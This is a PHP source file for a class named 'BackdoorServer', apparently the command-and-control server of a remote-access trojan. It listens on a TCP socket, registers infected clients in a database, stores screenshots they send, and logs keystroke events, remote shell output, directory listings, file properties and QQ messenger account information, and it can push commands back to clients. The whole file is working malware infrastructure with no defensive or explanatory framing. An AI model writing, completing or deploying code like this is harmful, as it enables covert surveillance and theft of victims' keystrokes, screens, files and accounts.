<?php
require_once 'config.php';

class BackdoorServer {
    private $socket;
    private $clients = [];
    private $db;
    private $logger;

    public function __construct() {
        $this->db = getDB();
        $this->logger = Logger::getInstance();
        $this->logger->info('Starting socket server');

        $this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($this->socket === false) {
            $error = 'Socket create failed: ' . socket_strerror(socket_last_error());
            $this->logger->error($error);
            die($error);
        }

        socket_set_option($this->socket, SOL_SOCKET, SO_REUSEADDR, 1);

        if (!socket_bind($this->socket, SERVER_HOST, SERVER_PORT)) {
            $error = 'Bind failed: ' . socket_strerror(socket_last_error());
            $this->logger->error($error, ['host' => SERVER_HOST, 'port' => SERVER_PORT]);
            die($error);
        }

        if (!socket_listen($this->socket, MAX_CLIENTS)) {
            $error = 'Listen failed: ' . socket_strerror(socket_last_error());
            $this->logger->error($error);
            die($error);
        }

        socket_set_nonblock($this->socket);

        $this->logger->info('Server started', [
            'host' => SERVER_HOST,
            'port' => SERVER_PORT,
            'max_clients' => MAX_CLIENTS,
        ]);

        echo "\n";
        echo "====================================\n";
        echo "   Socket server started\n";
        echo "====================================\n";
        echo 'Listen: ' . SERVER_HOST . ':' . SERVER_PORT . "\n";
        echo 'Log path: ' . LOG_PATH . "\n";
        echo 'Database: ' . DB_PATH . "\n";
        echo "Press Ctrl+C to stop\n";
        echo "====================================\n\n";
    }

    public function run() {
        $this->logger->info('Server running');
        $lastCleanup = time();

        while (true) {
            $newSocket = @socket_accept($this->socket);
            if ($newSocket !== false) {
                $this->handleNewClient($newSocket);
            }

            foreach ($this->clients as $clientId => &$client) {
                $this->handleClient($clientId, $client);
            }
            unset($client);

            if (time() - $lastCleanup > 10) {
                $this->cleanupDisconnected();
                $lastCleanup = time();
            }

            usleep(10000);
        }
    }

    private function handleNewClient($socket) {
        socket_set_nonblock($socket);
        socket_getpeername($socket, $ip, $port);

        $clientId = uniqid('client_', true);
        $this->clients[$clientId] = [
            'socket' => $socket,
            'ip' => $ip,
            'port' => $port,
            'connected' => true,
            'buffer' => '',
            'hostname' => '',
            'connect_time' => time(),
        ];

        try {
            $stmt = $this->db->prepare("INSERT INTO clients (client_id, ip_address, port, status) VALUES (?, ?, ?, 'online')");
            $stmt->execute([$clientId, $ip, $port]);
            $this->logger->info('Client connected', ['client_id' => $clientId, 'ip' => $ip, 'port' => $port]);
        } catch (PDOException $e) {
            $this->logger->error('Insert client failed: ' . $e->getMessage());
        }
    }

    private function handleClient($clientId, &$client) {
        if (!$client['connected']) {
            return;
        }

        $data = @socket_read($client['socket'], 8192);
        if ($data === false) {
            $error = socket_last_error($client['socket']);
            if ($error !== SOCKET_EWOULDBLOCK && $error !== SOCKET_EAGAIN) {
                $this->logger->warning('Client read error', [
                    'client_id' => $clientId,
                    'error' => socket_strerror($error),
                ]);
                $this->disconnectClient($clientId);
            }
            return;
        }

        if ($data === '') {
            $this->disconnectClient($clientId);
            return;
        }

        $client['buffer'] .= $data;

        while (strlen($client['buffer']) >= 8) {
            $lengthData = substr($client['buffer'], 0, 8);
            $length = unpack('J', $lengthData)[1];

            if (strlen($client['buffer']) < 8 + $length) {
                break;
            }

            $packetData = substr($client['buffer'], 8, $length);
            $client['buffer'] = substr($client['buffer'], 8 + $length);
            $this->processPacket($clientId, $packetData);
        }

        try {
            $stmt = $this->db->prepare('UPDATE clients SET last_seen = CURRENT_TIMESTAMP WHERE client_id = ?');
            $stmt->execute([$clientId]);
        } catch (PDOException $e) {}
    }

    private function processPacket($clientId, $data) {
        $packet = json_decode($data, true);
        if ($packet === null) {
            $this->logger->warning('Invalid packet', ['client_id' => $clientId, 'data_length' => strlen($data)]);
            return;
        }

        $type = $packet['type'] ?? 'unknown';
        $this->logger->debug('Received packet', [
            'client_id' => $clientId,
            'type' => $type,
            'size' => strlen($data),
        ]);

        switch ($type) {
            case 'host_name':
                $this->updateHostname($clientId, $packet['name'] ?? '');
                break;
            case 'screen':
                $this->saveScreenshot($clientId, $packet);
                break;
            case 'shell_output':
            case 'key_event':
            case 'dir_list_result':
            case 'file_properties':
            case 'monitor_info':
            case 'monitor_perf':
            case 'qq_status':
            case 'qq_info':
                $this->logCommand($clientId, $type, $packet);
                break;
            default:
                $this->logger->debug('Unknown packet type', ['client_id' => $clientId, 'type' => $type]);
                break;
        }
    }

    private function updateHostname($clientId, $hostname) {
        try {
            $stmt = $this->db->prepare('UPDATE clients SET hostname = ? WHERE client_id = ?');
            $stmt->execute([$hostname, $clientId]);
            if (isset($this->clients[$clientId])) {
                $this->clients[$clientId]['hostname'] = $hostname;
            }
            $this->logger->info('Updated hostname', ['client_id' => $clientId, 'hostname' => $hostname]);
        } catch (PDOException $e) {
            $this->logger->error('Update hostname failed: ' . $e->getMessage());
        }
    }

    private function saveScreenshot($clientId, $packet) {
        $imageData = base64_decode($packet['data'] ?? '');
        if (!$imageData) {
            return;
        }

        $filename = $clientId . '_' . time() . '.jpg';
        $filepath = SCREENSHOT_PATH . $filename;

        if (file_put_contents($filepath, $imageData) === false) {
            $this->logger->error('Write screenshot failed', ['client_id' => $clientId, 'filepath' => $filepath]);
            return;
        }

        try {
            $stmt = $this->db->prepare('INSERT INTO screenshots (client_id, image_path) VALUES (?, ?)');
            $stmt->execute([$clientId, $filename]);
            $this->logger->debug('Saved screenshot', ['client_id' => $clientId, 'filename' => $filename, 'size' => strlen($imageData)]);
        } catch (PDOException $e) {
            $this->logger->error('Save screenshot record failed: ' . $e->getMessage());
        }
    }

    private function logCommand($clientId, $type, $packet) {
        try {
            $stmt = $this->db->prepare('INSERT INTO command_logs (client_id, command_type, command_data, response_data) VALUES (?, ?, ?, ?)');
            $stmt->execute([$clientId, $type, json_encode(['timestamp' => time()]), json_encode($packet)]);
            $this->logger->debug('Logged command', ['client_id' => $clientId, 'type' => $type]);
        } catch (PDOException $e) {
            $this->logger->error('Log command failed: ' . $e->getMessage());
        }
    }

    private function disconnectClient($clientId) {
        if (!isset($this->clients[$clientId])) {
            return;
        }

        @socket_close($this->clients[$clientId]['socket']);
        $this->clients[$clientId]['connected'] = false;

        try {
            $stmt = $this->db->prepare("UPDATE clients SET status = 'offline' WHERE client_id = ?");
            $stmt->execute([$clientId]);
            $this->logger->info('Client disconnected', [
                'client_id' => $clientId,
                'ip' => $this->clients[$clientId]['ip'],
                'duration' => time() - $this->clients[$clientId]['connect_time'],
            ]);
        } catch (PDOException $e) {
            $this->logger->error('Update client status failed: ' . $e->getMessage());
        }
    }

    private function cleanupDisconnected() {
        $count = 0;
        foreach ($this->clients as $clientId => $client) {
            if (!$client['connected']) {
                unset($this->clients[$clientId]);
                $count++;
            }
        }

        if ($count > 0) {
            $this->logger->debug('Cleaned disconnected clients', ['count' => $count]);
        }
    }

    public function sendToClient($clientId, $packet) {
        if (!isset($this->clients[$clientId]) || !$this->clients[$clientId]['connected']) {
            $this->logger->warning('Tried to send data to disconnected client', ['client_id' => $clientId]);
            return false;
        }

        $data = json_encode($packet);
        $length = pack('J', strlen($data));
        $message = $length . $data;
        $sent = @socket_write($this->clients[$clientId]['socket'], $message, strlen($message));

        if ($sent === false) {
            $this->logger->error('Send data failed', [
                'client_id' => $clientId,
                'packet_type' => $packet['type'] ?? 'unknown',
            ]);
            return false;
        }

        $this->logger->debug('Sent packet', [
            'client_id' => $clientId,
            'type' => $packet['type'] ?? 'unknown',
            'size' => strlen($data),
        ]);
        return true;
    }

    public function __destruct() {
        foreach ($this->clients as $client) {
            @socket_close($client['socket']);
        }
        if ($this->socket) {
            @socket_close($this->socket);
        }
    }
}

function signalHandler($signo) {
    $logger = Logger::getInstance();
    $logger->warning('Received shutdown signal', ['signal' => $signo]);
    echo "\nShutting down server...\n";
    exit(0);
}

if (function_exists('pcntl_signal')) {
    pcntl_signal(SIGTERM, 'signalHandler');
    pcntl_signal(SIGINT, 'signalHandler');
}

try {
    $server = new BackdoorServer();
    $server->run();
} catch (Exception $e) {
    $logger = Logger::getInstance();
    $logger->error('Server exception: ' . $e->getMessage(), [
        'file' => $e->getFile(),
        'line' => $e->getLine(),
    ]);
    echo 'Server error: ' . $e->getMessage() . "\n";
}

